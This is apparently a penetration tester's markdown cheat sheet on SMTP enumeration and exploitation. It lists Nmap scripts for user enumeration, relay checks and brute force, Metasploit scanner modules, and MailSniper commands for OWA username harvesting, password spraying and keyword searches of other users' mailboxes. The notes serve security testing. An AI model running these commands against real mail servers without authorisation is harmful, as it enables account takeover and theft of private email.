---
tags:
  - Penetration-Testing
  - Services
---
## What is SMTP?
Utilized to handle the sending of emails.
- Paired with POP3 or IMAP

SMTP servers perform 3 main functions:
- **Verifies who is sending emails**
- **Sends outgoing mail**
- **If outgoing mail can't be delivered, sends message back to sender**

## Enumerating/Exploiting SMTP
- **Nmap Scripts**
	1. **smtp-enum-users**: Enumerates usernames on an SMTP server by using the EXPN, VRFY, and RCPT TO commands.
	2. **smtp-commands**: Attempts to determine the SMTP commands supported by an SMTP server.
	3. **smtp-open-relay**: Checks if an SMTP server is an open relay.
	4. **smtp-brute**: Performs brute-force password guessing against SMTP servers.
	5. **smtp-ntlm-info**: Retrieves information from SMTP servers that use NTLM authentication.
```bash
nmap --script smtp-commands,smtp-enum-users,smtp-open-relay -p 25,465,587 <target>
```

- **Metasploit**
```bash
use auxiliary/scanner/smtp/smtp_version

use auxiliary/scanner/smtp/smtp_enum
```

- **MailSniper (Microsoft Exchange/Office 365)**
1. User Enumeration
```powershell
Invoke-UsernameHarvestOWA -ExchangeHost mail.example.com -UserList users.txt
```

2. Password Spraying
```powershell
Invoke-PasswordSprayOWA -UserList users.txt -Password Winter2024 -OutFile results.txt
```

3. Email Search
```powershell
Invoke-GlobalSearch -ImpersonateUser targetuser@example.com -Mailbox targetmailbox@example.com -ExchangeHost mail.example.com -Terms "password, confidential"
```

4. Autodiscover Harvesting
```powershell
Invoke-EnumerateOWA -ExchangeHost mail.example.com
```
